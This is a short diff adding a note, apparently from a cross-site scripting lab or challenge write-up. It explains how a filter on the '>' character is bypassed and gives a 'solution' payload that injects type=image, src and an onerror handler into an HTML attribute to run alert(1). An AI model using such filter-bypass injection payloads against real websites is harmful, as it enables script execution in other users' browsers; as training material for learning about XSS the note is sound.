@@ -1,0 +1,4 @@
+In this section, the > symbol is blocked, so to bypass it, we create a type value and inject our code inside it. The result is successful.
+
+Solution Code= hi"type=image src onerror
+		=alert(1)
